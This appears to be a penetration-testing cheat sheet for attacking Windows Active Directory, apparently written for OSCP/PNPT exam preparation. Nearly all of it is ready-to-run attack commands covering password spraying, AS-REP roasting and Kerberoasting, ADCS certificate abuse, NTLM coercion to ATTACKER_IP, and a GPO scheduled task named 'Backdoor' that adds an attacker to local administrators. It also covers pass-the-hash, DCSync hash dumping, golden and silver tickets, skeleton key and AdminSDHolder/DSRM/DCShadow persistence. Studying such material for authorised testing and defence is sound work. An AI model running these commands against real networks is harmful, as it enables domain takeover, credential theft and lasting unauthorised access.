# Active Directory Attack Methodology

> Based on OSCP/PNPT — Full AD Kill Chain

## Overview

Active Directory (AD) is the dominant identity platform in enterprise environments. Compromising AD typically means compromising the entire organization. This methodology covers the full attack chain from initial foothold to domain dominance.

**Prerequisites**: Network access to the AD environment (VPN, compromised host, physical access). At minimum, you can reach a Domain Controller on standard ports (88, 135, 139, 389, 445, 636).

---

## Phase 1: Reconnaissance

### Unauthenticated Enumeration

```bash
# Discover Domain Controllers via DNS SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
dig SRV _ldap._tcp.dc._msdcs.corp.local @10.10.10.5

# LDAP anonymous bind — get base DN and domain info
ldapsearch -x -H ldap://10.10.10.5 -s base namingContexts
ldapsearch -x -H ldap://10.10.10.5 -s base defaultNamingContext

# Null session RID cycling to enumerate users
crackmapexec smb 10.10.10.5 -u '' -p '' --rid-brute 10000
impacket-lookupsid corp.local/guest@10.10.10.5 -no-pass

# Enumerate password policy (for spray tuning)
crackmapexec smb 10.10.10.5 -u '' -p '' --pass-pol
enum4linux -P 10.10.10.5
```

### Authenticated Enumeration — BloodHound

```bash
# SharpHound collector (run from Windows domain-joined machine)
.\SharpHound.exe -c all --zipfilename bloodhound_output.zip
.\SharpHound.exe -c all,gpolocalgroup --zipfilename full_collection.zip

# BloodHound Python collector (from Linux, no domain join needed)
bloodhound-python -u 'user' -p 'password' -d corp.local -ns 10.10.10.5 -c all
bloodhound-python -u 'user' -p 'password' -d corp.local -dc dc01.corp.local -c all --zip

# Import into BloodHound GUI
# 1. Start Neo4j: sudo neo4j console
# 2. Start BloodHound: ./BloodHound --no-sandbox
# 3. Drag and drop the ZIP file
```

### Authenticated Enumeration — PowerView

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Domain information
Get-Domain
Get-DomainController
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess

# User enumeration
Get-DomainUser | Select-Object samaccountname, description, memberof
Get-DomainUser -SPN                          # Kerberoastable accounts
Get-DomainUser -PreauthNotRequired           # AS-REP roastable accounts
Get-DomainUser -AdminCount                   # Protected users (likely admins)

# Group enumeration
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty member
Get-DomainGroup -AdminCount

# Computer enumeration
Get-DomainComputer | Select-Object dnshostname, operatingsystem
Get-DomainComputer -Unconstrained            # Unconstrained delegation hosts

# ACL enumeration
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# GPO enumeration
Get-DomainGPO | Select-Object displayname, gpcfilesyspath
Get-DomainGPOLocalGroup                      # GPOs that set local admins

# Trust enumeration
Get-DomainTrust
Get-ForestTrust
```

---

## Phase 2: Initial Access

### Password Spraying

```bash
# Kerbrute — fast Kerberos-based spray (no account lockout artifacts in logs)
kerbrute passwordspray -d corp.local users.txt 'Summer2024!'
kerbrute passwordspray -d corp.local users.txt 'Welcome1!' --dc 10.10.10.5

# CrackMapExec spray
crackmapexec smb 10.10.10.5 -u users.txt -p 'Summer2024!' --continue-on-success
crackmapexec smb 10.10.10.5 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Common password patterns to try:
# Season+Year+!  (Summer2024!, Winter2024!)
# CompanyName+123 (Corp123!)
# Welcome1!, Password1!, Changeme1!

# Validate found credentials
crackmapexec smb 10.10.10.5 -u 'jsmith' -p 'Summer2024!' -d corp.local
```

### AS-REP Roasting (No Pre-Authentication)

```bash
# Find and roast AS-REP vulnerable accounts (no creds needed if you have usernames)
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.5 -format hashcat -outputfile asrep_hashes.txt

# With valid credentials (auto-discovers vulnerable accounts)
impacket-GetNPUsers corp.local/user:password -dc-ip 10.10.10.5 -request -format hashcat -outputfile asrep_hashes.txt

# Rubeus from Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Phase 3: Privilege Escalation

### Kerberoasting

```bash
# Impacket — request TGS for all SPN accounts
impacket-GetUserSPNs corp.local/user:password -dc-ip 10.10.10.5 -request -outputfile kerberoast_hashes.txt

# Rubeus — from Windows
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:kerberoast_hashes.txt

# Targeted Kerberoasting (set SPN on account you have GenericAll/GenericWrite on)
# PowerView:
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
# Then Kerberoast that user, then clean up:
Set-DomainObject -Identity targetuser -Clear serviceprincipalname

# Crack with hashcat (mode 13100 for TGS-REP etype 23)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Constrained Delegation Abuse

```bash
# Find constrained delegation accounts
impacket-findDelegation corp.local/user:password -dc-ip 10.10.10.5

# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Abuse: Request ticket as admin to the delegated service
# S4U2Self + S4U2Proxy
impacket-getST corp.local/svc_account:password -spn cifs/target.corp.local -impersonate administrator -dc-ip 10.10.10.5
export KRB5CCNAME=administrator@cifs_target.corp.local@CORP.LOCAL.ccache
impacket-psexec corp.local/administrator@target.corp.local -k -no-pass

# Rubeus
.\Rubeus.exe s4u /user:svc_account /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
```

### ADCS (Active Directory Certificate Services) — ESC1-ESC8

```bash
# Enumerate vulnerable certificate templates
certipy find -u user@corp.local -p 'password' -dc-ip 10.10.10.5 -vulnerable

# ESC1: Misconfigured certificate template (enrollee supplies SAN)
certipy req -u user@corp.local -p 'password' -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local -dc-ip 10.10.10.5

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5

# ESC4: Template with WriteProperty/WriteDacl — modify the template to be ESC1
certipy template -u user@corp.local -p 'password' -template VulnTemplate -save-old

# ESC8: NTLM relay to ADCS HTTP enrollment
certipy relay -ca ca.corp.local -template DomainController
# In another terminal, coerce authentication:
python3 PetitPotam.py ATTACKER_IP DC_IP

# ESC11: NTLM relay to ADCS RPC enrollment (ICPR)
certipy relay -ca ca.corp.local -template DomainController -target ca.corp.local
```

### GPO Abuse

```powershell
# Check if you have write access to any GPO
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl|WriteOwner|GenericAll|GenericWrite'
}

# Use SharpGPOAbuse to add a local admin
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount targetuser --GPOName "Vulnerable GPO"

# Or add an immediate scheduled task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author CORP\admin \
  --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" \
  --GPOName "Vulnerable GPO"

# Force GPO update
gpupdate /force
```

---

## Phase 4: Lateral Movement

### Pass-the-Hash

```bash
# CrackMapExec — validate hash and execute commands
crackmapexec smb 10.10.10.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --local-auth
crackmapexec smb 10.10.10.5 -u administrator -H 'LM:NT' -x 'whoami'

# Impacket PsExec
impacket-psexec corp.local/administrator@10.10.10.5 -hashes 'LM:NT'

# Impacket WMIExec (more stealthy — no service creation)
impacket-wmiexec corp.local/administrator@10.10.10.5 -hashes 'LM:NT'

# Impacket SMBExec
impacket-smbexec corp.local/administrator@10.10.10.5 -hashes 'LM:NT'

# Evil-WinRM with hash
evil-winrm -i 10.10.10.5 -u administrator -H 'NT_HASH'
```

### Overpass-the-Hash (Pass-the-Key)

```bash
# Convert NTLM hash to Kerberos ticket, then use Kerberos auth
impacket-getTGT corp.local/administrator -hashes 'LM:NT' -dc-ip 10.10.10.5
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass

# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NT_HASH /ptt
```

### WinRM

```bash
# Evil-WinRM with password
evil-winrm -i 10.10.10.5 -u 'administrator' -p 'password'

# PowerShell remoting
Enter-PSSession -ComputerName dc01.corp.local -Credential corp\administrator
Invoke-Command -ComputerName dc01 -ScriptBlock { whoami; hostname }
```

### DCOM

```bash
# Impacket DCOM execution
impacket-dcomexec corp.local/administrator:password@10.10.10.5
impacket-dcomexec corp.local/administrator@10.10.10.5 -hashes 'LM:NT' -object MMC20
```

---

## Phase 5: Domain Dominance

### DCSync

```bash
# Dump all hashes (requires Replicating Directory Changes + Replicating Directory Changes All)
impacket-secretsdump corp.local/admin:password@10.10.10.5 -just-dc
impacket-secretsdump corp.local/admin:password@10.10.10.5 -just-dc-ntlm

# Dump specific user
impacket-secretsdump corp.local/admin:password@10.10.10.5 -just-dc-user krbtgt

# Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv
```

### Golden Ticket

```bash
# Requirements: krbtgt NTLM hash, domain SID
# Get domain SID
impacket-lookupsid corp.local/admin:password@10.10.10.5 | head -1

# Forge Golden Ticket with Impacket
impacket-ticketer -nthash KRBTGT_NT_HASH -domain-sid S-1-5-21-XXXX -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@dc01.corp.local -k -no-pass

# Mimikatz
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_NT_HASH /ptt
```

### Silver Ticket

```bash
# Forge ticket for a specific service (e.g., CIFS on a server)
# Requires: service account NTLM hash, domain SID, target SPN
impacket-ticketer -nthash SERVICE_NT_HASH -domain-sid S-1-5-21-XXXX -domain corp.local \
  -spn cifs/target.corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-smbclient corp.local/administrator@target.corp.local -k -no-pass

# Mimikatz
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-XXXX \
  /target:target.corp.local /service:cifs /rc4:SERVICE_NT_HASH /ptt
```

### Skeleton Key

```powershell
# Mimikatz — inject into LSASS on a DC (password "mimikatz" works for any account)
privilege::debug
misc::skeleton

# Now authenticate as any user with password "mimikatz"
# Requires physical/RDP access to DC and runs in memory only (lost on reboot)
```

---

## Phase 6: Persistence

### AdminSDHolder

```powershell
# Add ACE to AdminSDHolder — propagates to all protected groups within 60 minutes
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
  -PrincipalIdentity attacker_user -Rights All

# Trigger SDProp manually (propagate immediately)
Invoke-ADSDPropagation
```

### DSRM (Directory Services Restore Mode)

```powershell
# On DC — change DSRM password and enable network logon
ntdsutil "set dsrm password" "reset password on server null" "password123!" q q

# Enable DSRM account for network logon
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Now PtH with DSRM administrator hash
impacket-psexec -hashes 'LM:DSRM_NT' 'administrator@dc01.corp.local'
```

### DCShadow

```powershell
# Mimikatz — register rogue DC and push changes
# Terminal 1 (SYSTEM): Start the rogue DC
lsadump::dcshadow /object:targetuser /attribute:primaryGroupID /value:512

# Terminal 2 (Domain Admin): Push the change
lsadump::dcshadow /push
```

---

## Attack Path Decision Tree

```
Start: Do you have credentials?
├── No
│   ├── LLMNR/NBT-NS Poisoning (Responder) → Capture NTLMv2 → Crack offline
│   ├── AS-REP Roasting (if usernames known) → Crack offline
│   ├── Null session enumeration → RID brute → Password spray
│   └── ADCS ESC8 relay (if HTTP enrollment enabled) → Certificate → Auth
├── Yes (low-priv user)
│   ├── BloodHound → Find attack paths
│   ├── Kerberoasting → Crack SPN account passwords
│   ├── ACL abuse → GenericAll/WriteDacl chains
│   ├── ADCS ESC1-4 → Certificate impersonation
│   └── Constrained/Unconstrained delegation abuse
└── Yes (local admin somewhere)
    ├── Dump LSASS → Extract NTLM hashes and Kerberos tickets
    ├── Pass-the-Hash/Overpass-the-Hash → Lateral movement
    ├── NTLM relay (if signing disabled) → Relay to high-value targets
    └── DCSync (if Replicating Directory Changes rights) → Full domain compromise
```
